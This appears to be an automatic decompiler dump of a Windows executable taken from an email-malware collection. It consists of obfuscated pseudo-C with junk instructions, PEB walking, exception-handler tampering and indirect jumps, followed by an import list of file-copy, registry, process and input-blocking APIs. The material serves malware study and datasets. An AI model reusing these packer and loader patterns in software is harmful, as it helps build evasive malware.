/*	This file was automatically created by
 *	Reverse Engineering Compiler 1.6 (C) Giampiero Caprino (Mar 31 2002)
 *	Input file: './malware_via_email/malware_2058/ia32_pe/subject.exe'
 */

/*	Procedure: 0x00401012 - 0x004010ED
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401012()
{



    eax = eax - -1027486019;
    asm("xchg eax,edx");
    ecx = esp;
    di = di + 75;
    ecx = ecx << 16;
    edx = edx ^ ecx;
L00401023:
    ecx = ecx >> 16;
    asm("Unknown opcode 0xc1");
    asm("lock pop ss");
    ecx = ecx + 1179652;
    edi = edi + 1;
    ebp = *ecx;
    asm("ror edx,0xf");
    return;
    *LF6DC0000 = *LF6DC0000 + dl;
L00401040:
    (fsave) *eax;
    esp = esp - 1;
    if(-8 = *eax * ecx) {
        goto L00401023;
    }
    asm("aad 0x0");
    return;
    *eax = *eax + al;
    *eax = *eax + al;
    *(eax + 16384) = *(eax + 16384) + dh;
    *eax = *eax ^ al;
    dh = dh + bl;
    ebx = ebx - 1;
    asm("adc [eax+0x0],al");
    *eax = *eax + al;
    *eax = *eax & al;
    asm("daa");
    asm("sbb eax,ecx");
    *%ss:0x401000] = *%ss:0x401000] + cl;
    edi = edi + 1;
    asm("adc [eax+0x0],al");
    if(*ecx = *ecx + bl) {
        goto L00401040;
    }
    asm("clc");
    asm("adc [eax+0x0],al");
    (save)edi;
    eax = eax & *eax;
    if(!(eax & 199)) {
        bl = bl + bl;
        ecx = ecx | esp;
        edx = edx - eax;
        esi = ebx;
        asm("ror ax,0x2");
        edi = 4194304;
        edx = edx - 1;
        ecx = 163840;
        ax = ax | 8;
        asm("rep movsb");
        (save)-4194305;
    }
    (restore)esi;
    esi = !esi;
    ecx = ecx ^ 1633908101;
    edi = edi + ebp;
    *esi = 5265997;
    edx = edx - 1;
    eax = *(esi + 60);
    edi = edi & edx;
    esi = esi + eax;
    edx = edx + edi;
    *esi = 17744;
    ecx = 17743;
    esi = esi >> 2;
    (save)0x4112d0;
    edx = edx - -636875771;
    eax = 0;
    asm("rol ecx,0x7");
}

/*	Procedure: 0x004010EE - 0x004011E5
 *	Argument size: 24
 *	Local size: 0
 *	Save regs size: 0
 */

L004010EE(A0, A10, A14)
/* unknown */ void  A0;
/* unknown */ void  A10;
/* unknown */ void  A14;
{



    asm("rol si,0x3");
    (save)ebp;
    ebp = esp;
    (save)ecx;
    if(!( *(edx + -1962413375) = *(edx + -1962413375) + ch)) {
        al = al + 102;
        asm("ror ecx,0xb");
        eax = esi;
        asm("ror ecx,0x18");
        esi = esi + 79;
        edi = edi & 333745733;
        esi = esi + -19;
        edx = ~edx;
        ecx = *esi;
        edi = 60;
        asm("Unknown opcode 0xc1");
        asm("repne adc eax,0xce01fe01");
    }
    edi = edi + 1;
    ecx = *esi + 46 + -18;
    asm("stc");
    ecx = ecx + eax;
    asm("wait");
    edi = ecx;
    edx = *edi + eax;
    asm("cld");
    edi = edi - -4;
    ecx = *edi + eax;
    edi = edi + 4;
    asm("stc");
    esi = *edi + eax;
    asm("stc");
    (save)esi;
    (save)edx;
    asm("cld");
    (save)ecx;
    asm("cmc");
    eax = A14;
    asm("wait");
    edx = ecx;
    (restore)ecx;
    ecx = 0;
    asm("cmc");
    (save)ecx;
    esi = A10;
    edi = esi;
    esi = esi + *edx;
    for(ecx = 0; 1; asm("cmc");) {
        cl = cl + *esi;
        esi = esi + 1;
        asm("clc");
        asm("rol ecx,0x1e");
        asm("clc");
        ecx = ecx ^ 563054963;
        if(*esi != 0) {
            continue;
        }
        ecx = ecx ^ eax;
        == ? L0040119b : ;
        (restore)ecx;
        ecx = ecx + 1;
        (save)ecx;
        edx = edx + 4;
        esi = *edx + edi;
        asm("wait");
        ecx = 0;
    }
    (restore)eax;
    eax = eax << 1;
    esi = A0 + eax;
    ecx = 0;
    asm("cmc");
    ecx = *esi << 2;
    asm("clc");
    (restore)esi;
    (save)esi;
    asm("cmc");
    esi = esi + ecx;
    (restore)ecx;
    asm("stc");
    edx = *esi;
    (restore)esi;
    asm("rol eax,0x6");
    edx = edx + edi;
    ecx = ecx & 1722429125;
    (restore)edi;
    asm("rol si,0xa");
    esp = esp + 4;
    asm("rol eax,0x7");
    esp = esp + 4;
    ecx = ecx | 949995709;
    eax = eax - ebp;
    goto ( *edi);
    asm("Unknown opcode 0xc1");
    *esi & 193;
    *eax();
}

/*	Procedure: 0x004011E6 - 0x00401254
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

__entry_point__()
{



    edx = edx - 1;
    edx = -603969894;
    edi = edi + *esp;
    *__imp__GetCommandLineA();
    edi = edi + 1;
    *L0040106f();
    ecx = esp;
    esi = !esi;
    edx = !L00000000;
    esi = esi + -734523203;
    do {
        eax = *ecx;
        ecx = ecx - 1;
        edi = !edi;
    } while(eax != edx);
    edx = 0x4010f2;
    esi = *L004010F2;
    edi = edi - -215766651;
    eax = *esp;
    do {
        eax = eax + 1;
        edi = edi & ebx;
        ecx = *eax;
        edx = ~edx;
        ecx = ecx - esi;
    } while(ecx != 0);
    esi :: 0;
    asm("xchg edi,eax");
    edx = edx - 1;
    edi = edi - 5;
    esi = esi | -1074156403;
    ax = *edi;
    ecx = ecx + 1;
    ebx = eax;
    asm("ror edx,0x1");
    asm("Unknown opcode 0xc1");
    asm("lock sbb eax,0xc124348b");
    asm("iret");
}

/*	Procedure: 0x00401255 - 0x00401560
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401255()
{
	/* unknown */ void  Vfffffffc;



    asm("sbb ecx,[ecx+0x1041bff1]");
    eax = eax + 1;
    *(ecx + -1509296666) = *(ecx + -1509296666) + al;
    asm("outsb");
    esi = *(edi + 10);
    for(edi = edi + ecx; 1; edi = edi - eax) {
        eax = *ecx;
        edx = edx ^ edi;
        ecx = ecx - -1;
        edx = eax;
        edi = edi + edx;
        edx = edx ^ esi;
        ax = ax - 2;
        if(edx == 0) {
            goto L00401285;
        }
    }
    di = di | 2;
L00401285:
    esi = esi | -833055971;
    asm("xchg ebp,ecx");
    di = di - 111;
    (save)4162152;
    eax = 0;
    ecx = ebx << 16;
    edx = ~edx;
    ecx = ecx >> 16;
    asm("rol ax,0x9");
    *esp = *esp + ecx;
    asm("rol ax,0xf");
    edi = 0;
    cx = cx + 8;
    eax = *%fs:edi];
    asm("ror dx,0xc");
    (save)eax;
    esi = esi - edi;
    ecx = esp;
    esi = esi & 2115820693;
    *%fs:0x0] = ecx;
    eax = eax + eax;
    (save)edi;
    asm("rol edx,0xa");
    eax = ebp;
    asm("Unknown opcode 0xc1");
    *LFEC34750 = ~( *LFEC34750);
    asm("loop 0x4012e3");
    asm("cld");
    *eax = *eax + al;
    *eax = *eax + al;
    ah = ah + bh;
    bh = bh + dh;
    asm("xchg eax,ebx");
    *eax = *eax + al;
    *(ebp + 102) = *(ebp + 102) + al;
    ecx = ecx + -91;
    asm("rol edx,0x8");
    eax = Vfffffffc;
    esi = esi >> 19;
    asm("xchg esp,eax");
    asm("rol cx,0x1");
    edi = *esp;
    (restore)esi;
    edx = edx & eax;
    ecx = 0;
    esi = esi - -322683707;
    *%fs:ecx] = edi;
    asm("ror eax,0x14");
    esp = esp + 4;
    edx = edx + 1;
    eax = 48;
    di = di | 54;
    esi = esi - 1707133997;
    edi = *( *%fs:eax] + 12);
    asm("rol esi,0x14");
    edx = *(edi + 28);
    di = di + 106;
    eax = *edx;
    asm("rol edx,0x1e");
    ecx = 8;
    asm("Unknown opcode 0xc1");
    asm("Unknown opcode 0xf2");
    asm("Unknown opcode 0x0f");
    eax = eax + ecx;
    ecx = ecx - 1725478973;
    esi = *eax;
    asm("ror cx,0x3");
    edx = edx + eax | -534036339;
    (save)-1218242330;
    cx = cx - 121;
    ebp = esi;
    edi = edi + ecx;
    edx = edx + 1;
    edi = 0x401075;
    ecx = ecx ^ -1974601859;
    (save)esi;
    edx = edx + esi;
    *( *L00401075)();
    esi = esi - 455518253;
    (save)164160;
    cx = cx | -79;
    eax = 64;
    asm("rol di,0x3");
    (save)eax;
    ecx = edx;
    esi = esi ^ edi;
    eax = *ecx();
    ebx = eax;
    asm("wait");
    eax = eax + 163845;
    *eax = ebp;
    esi = esi + 1;
    edi = edi >> 12;
    ecx = ecx - -1553070203;
    edx = *L00401075;
    (save)-383965064;
    eax = eax | -39871530;
    ecx = ebp;
    asm("rol di,0xc");
    (save)ecx;
    eax = eax & ebp;
    eax = *edx();
    edi = edi & edx;
    esi = ebx;
    eax = eax | 1755226773;
    esi = esi + 163861;
    ecx = ecx + 1;
    *esi = edx;
    eax = eax + -115254691;
    (save)1799954061;
    asm("rol edi,0x9");
    (save)ebp;
    esi = esi - -1311969771;
    asm("ror eax,0x18");
    esi = esi + *esp;
    ecx = *L00401075;
    edi = !edi;
    *ecx();
    ecx = !ecx;
    eax = ebx;
    edi = ~edi;
    eax = eax + 163876;
    esi = esi & edx;
    asm("xchg eax,ecx");
    asm("ror di,0x9");
    *ecx = edx;
    ecx = ecx ^ 1331079373;
    (save)-691864898;
    asm("rol di,0x6");
    edx = 0x401075;
    asm("rol edi,0x19");
    ecx = *edx;
    asm("Unknown opcode 0xc1");
    asm("lock or [ecx+0xc08366ee],cl");
    *(esi - 1) = dl;
    asm("ror dword [ecx+0xc08390e0],1");
    asm("xchg eax,ebx");
    (save)eax;
    (save)64;
    eax = 4194304;
    esi = 705271437;
    esi = *L0040003C;
    asm("Unknown opcode 0xc1");
    *LC166C601 = !( *LC166C601);
    *(edi + edi * 4) = 80;
    esi = esi + edi;
    di = di + 13;
    (save) *esi;
    asm("ror si,0xf");
    eax = *edx(eax);
    edx = 563054963;
    asm("ror edi,0x17");
    (save)567254110;
    ax = ax | -2;
    esi = esi + ecx;
    ecx = ecx ^ edx;
    asm("ror edi,0x13");
    eax = eax & -2094095347;
    *ecx = 1083183240;
    asm("rol edi,0x19");
    edx = ~edx;
    edx = 563054963;
    eax = eax - 134157966;
    ecx = ecx + ebx;
    edi = -493842288;
    eax = eax - 1;
    *L00401533 = -493842288;
    ecx = !ecx;
    eax = eax & ebx;
    esi = 48;
    asm("ror di,0x8");
    edx = edx ^ ebx;
    edi = edi + *esp;
    ecx = *%fs:esi] + 4;
    asm("wait");
    edi = *ecx;
    edx = edx ^ edi;
    edi = edi + 1;
    edx = !edx;
    edi = edi + *L00401055;
    edx :: 0;
    eax = 4202578 + edi;
    ecx = 773;
    edx = 0;
    asm("Unknown opcode 0xc1");
    *ecx = ~( *ecx);
    asm("rol si,0xe");
    dl = *eax;
    asm("rol edi,0x5");
    asm("Unknown opcode 0xc1");
    *edx = !( *edx);
    dl = dl ^ 186;
    edi = edi + 1;
    asm("std");
    asm("sbb eax,0xd6017d8f");
    asm("sti");
    asm("sbb eax,0x66e5a9bf");
    ecx = ecx + 118;
    asm("Unknown opcode 0xc1");
    asm("lock sbb cl,al");
    asm("retf 0xb806");
    (save)ebp;
    asm("adc [eax+0x0],al");
    esi = esi + *esp;
    edi = *eax;
    ecx = !ecx;
    ecx = 4202578;
    esi = esi ^ ebp;
    edi = edi + 4202578;
    eax = eax & -2146111739;
    edx = !edx;
    goto ( *edi);
}

/* address  size  */
/* 0x004011e6       0 */ /* unknown */ void 	__entry_point__;
/* 0x00402000       0 */ /* unknown */ void 	__imp__WriteFile;
/* 0x00402004       0 */ /* unknown */ void 	__imp__CopyFileW;
/* 0x00402008       0 */ /* unknown */ void 	__imp__FindFirstFileA;
/* 0x0040200c       0 */ /* unknown */ void 	__imp__CopyFileExW;
/* 0x00402010       0 */ /* unknown */ void 	__imp__GetCPInfo;
/* 0x00402014       0 */ /* unknown */ void 	__imp__GetFileSize;
/* 0x00402018       0 */ /* unknown */ void 	__imp__OpenFileMappingA;
/* 0x0040201c       0 */ /* unknown */ void 	__imp__GetCommandLineA;
/* 0x00402020       0 */ /* unknown */ void 	__imp__Sleep;
/* 0x00402024       0 */ /* unknown */ void 	__imp__ReadFile;
/* 0x00402028       0 */ /* unknown */ void 	__imp__DeleteFileW;
/* 0x0040202c       0 */ /* unknown */ void 	__imp__CopyFileA;
/* 0x00402030       0 */ /* unknown */ void 	__imp__GetLastError;
/* 0x00402034       0 */ /* unknown */ void 	__imp__CreateProcessA;
/* 0x00402038       0 */ /* unknown */ void 	__imp__ReadConsoleA;
/* 0x0040203c       0 */ /* unknown */ void 	__imp__CreateDirectoryA;
/* 0x00402040       0 */ /* unknown */ void 	__imp__ExitThread;
/* 0x00402044       0 */ /* unknown */ void 	__imp__DeleteAtom;
/* 0x00402048       0 */ /* unknown */ void 	__imp__GetFileTime;
/* 0x0040204c       0 */ /* unknown */ void 	__imp__FindAtomA;
/* 0x00402050       0 */ /* unknown */ void 	__imp__GetStdHandle;
/* 0x00402058       0 */ /* unknown */ void 	__imp__LoadCursorA;
/* 0x0040205c       0 */ /* unknown */ void 	__imp__IsMenu;
/* 0x00402060       0 */ /* unknown */ void 	__imp__CopyImage;
/* 0x00402064       0 */ /* unknown */ void 	__imp__DrawIcon;
/* 0x00402068       0 */ /* unknown */ void 	__imp__CloseWindow;
/* 0x0040206c       0 */ /* unknown */ void 	__imp__DialogBoxParamA;
/* 0x00402070       0 */ /* unknown */ void 	__imp__GetFocus;
/* 0x00402074       0 */ /* unknown */ void 	__imp__CalcMenuBar;
/* 0x00402078       0 */ /* unknown */ void 	__imp__BlockInput;
/* 0x0040207c       0 */ /* unknown */ void 	__imp__GetMenu;
/* 0x00402080       0 */ /* unknown */ void 	__imp__GetCursor;
/* 0x00402084       0 */ /* unknown */ void 	__imp__InsertMenuA;
/* 0x00402088       0 */ /* unknown */ void 	__imp__DrawTextA;
/* 0x0040208c       0 */ /* unknown */ void 	__imp__GetDlgItem;
/* 0x00402090       0 */ /* unknown */ void 	__imp__DrawTextW;
/* 0x00402094       0 */ /* unknown */ void 	__imp__AlignRects;
/* 0x00402098       0 */ /* unknown */ void 	__imp__GetDC;
/* 0x0040209c       0 */ /* unknown */ void 	__imp__EndDialog;
/* 0x004020a0       0 */ /* unknown */ void 	__imp__IsWindow;
/* 0x004020a4       0 */ /* unknown */ void 	__imp__DialogBoxParamW;
/* 0x004020ac       0 */ /* unknown */ void 	__imp__ImageList_LoadImageW;
/* 0x004020b0       0 */ /* unknown */ void 	__imp__ImageList_Replace;
/* 0x004020b4       0 */ /* unknown */ void 	__imp__ImageList_GetIconSize;
/* 0x004020b8       0 */ /* unknown */ void 	__imp__ImageList_GetImageCount;
/* 0x004020bc       0 */ /* unknown */ void 	__imp__InitCommonControls;
/* 0x004020c0       0 */ /* unknown */ void 	__imp__ImageList_BeginDrag;
/* 0x004020c4       0 */ /* unknown */ void 	__imp__ImageList_ReplaceIcon;
/* 0x004020c8       0 */ /* unknown */ void 	__imp__ImageList_Create;
/* 0x004020cc       0 */ /* unknown */ void 	__imp__ImageList_AddIcon;
/* 0x004020d0       0 */ /* unknown */ void 	__imp__ImageList_Destroy;
/* 0x004020d4       0 */ /* unknown */ void 	__imp__ImageList_EndDrag;
/* 0x004020d8       0 */ /* unknown */ void 	__imp__ImageList_AddMasked;
/* 0x004020dc       0 */ /* unknown */ void 	__imp__ImageList_DragEnter;
/* 0x004020e0       0 */ /* unknown */ void 	__imp__ImageList_Draw;
/* 0x004020e4       0 */ /* unknown */ void 	__imp__ImageList_LoadImageA;
/* 0x004020e8       0 */ /* unknown */ void 	__imp__ImageList_Read;
/* 0x004020ec       0 */ /* unknown */ void 	__imp__ImageList_GetIcon;
/* 0x004020f0       0 */ /* unknown */ void 	__imp__ImageList_DragLeave;
/* 0x004020f4       0 */ /* unknown */ void 	__imp__ImageList_GetDragImage;
/* 0x004020f8       0 */ /* unknown */ void 	__imp__ImageList_LoadImage;
/* 0x00402100       0 */ /* unknown */ void 	__imp__RegDeleteValueW;
/* 0x00402104       0 */ /* unknown */ void 	__imp__RegEnumKeyA;
/* 0x00402108       0 */ /* unknown */ void 	__imp__RegDeleteValueA;
/* 0x0040210c       0 */ /* unknown */ void 	__imp__RegEnumKeyW;
/* 0x00402110       0 */ /* unknown */ void 	__imp__RegEnumValueA;
/* 0x00402114       0 */ /* unknown */ void 	__imp__RegEnumKeyExW;
/* 0x00402118       0 */ /* unknown */ void 	__imp__RegGetKeySecurity;
/* 0x0040211c       0 */ /* unknown */ void 	__imp__RegEnumValueW;
/* 0x00402120       0 */ /* unknown */ void 	__imp__RegOpenKeyExW;
/* 0x00402124       0 */ /* unknown */ void 	__imp__RegFlushKey;
/* 0x00402128       0 */ /* unknown */ void 	__imp__RegOpenKeyExA;
/* 0x0040212c       0 */ /* unknown */ void 	__imp__RegQueryValueExA;
/* 0x00402130       0 */ /* unknown */ void 	__imp__RegReplaceKeyA;
/* 0x00402134       0 */ /* unknown */ void 	__imp__RegLoadKeyA;
/* 0x00402138       0 */ /* unknown */ void 	__imp__RegEnumKeyExA;
/* 0x0040213c       0 */ /* unknown */ void 	__imp__RegLoadKeyW;
/* 0x00402140       0 */ /* unknown */ void 	__imp__RegQueryInfoKeyW;
/* 0x00402144       0 */ /* unknown */ void 	__imp__RegCreateKeyExA;
/* 0x0040214c       0 */ /* unknown */ void 	__imp__RestoreDC;
/* 0x00402150       0 */ /* unknown */ void 	__imp__GetPixel;
/* 0x00402154       0 */ /* unknown */ void 	__imp__AddFontResourceA;
/* 0x00402158       0 */ /* unknown */ void 	__imp__BeginPath;
/* 0x0040215c       0 */ /* unknown */ void 	__imp__GetClipBox;
/* 0x00402160       0 */ /* unknown */ void 	__imp__SetTextColor;
/* 0x00402164       0 */ /* unknown */ void 	__imp__CancelDC;
/* 0x00402168       0 */ /* unknown */ void 	__imp__CloseFigure;
/* 0x0040216c       0 */ /* unknown */ void 	__imp__AddFontResourceTracking;
/* 0x00402170       0 */ /* unknown */ void 	__imp__AddFontMemResourceEx;
/* 0x00402174       0 */ /* unknown */ void 	__imp__DeleteObject;
/* 0x00402178       0 */ /* unknown */ void 	__imp__DeleteDC;
/* 0x0040217c       0 */ /* unknown */ void 	__imp__CopyMetaFileA;
/* 0x00402180       0 */ /* unknown */ void 	__imp__GetPixel;
/* 0x00402184       0 */ /* unknown */ void 	__imp__CreateSolidBrush;
/* 0x00402188       0 */ /* unknown */ void 	__imp__CloseMetaFile;
/* 0x0040218c       0 */ /* unknown */ void 	__imp__ClearBrushAttributes;
#if 0 /* auxiliary information */
# Current option values:
option: +asmflush
option: -compactcalls
option: +compactexprs
option: +compactifs
option: +compset
option: -dfoproc
option: -disasmonly
option: -displaylabels
option: +doblocks
option: +docase
option: +dofor
option: +doifs
option: +dointrinsics
option: +doloops
option: +donullgotos
option: +dopackloops
option: +dopackstmt
option: +doremlabs
option: +dosimplify
option: -dosort
option: +dostmts
option: +doswitch
option: +dowhile
option: -dumpaddrs
option: -dumpcall
option: -dumpcomments
option: -dumpdfo
option: +dumpdoms
option: -dumpsblocks
option: -dumpsets
option: -dumpsizes
option: -dumpstmtid
option: +fatcase
option: -flag16
option: +fullscreen
option: -genpattern
option: -help
option: -hexconst
option: -html
option: +insertlabels
option: -int16
option: +int32
option: -interactive
option: -isvb5
option: +locals
option: -nohtmltabs
option: -nostackoffs
option: -objdump
option: -okclone
option: -outprocs
option: -outrefs
option: -overrule
option: +rdonly
option: -showblocks
option: -showjump
option: -showlabel
option: -showprotosym
option: -showreg
option: -showstring
option: -silent
option: +simplifyexprs
option: -stackalign16
option: -stackalign4
option: -stackalign8
option: -strallregions
option: -traceall
option: -tracesets
option: +types
option: -usesymtab
option: -validatebr
option: -validatereg
option: +validatestr
#endif
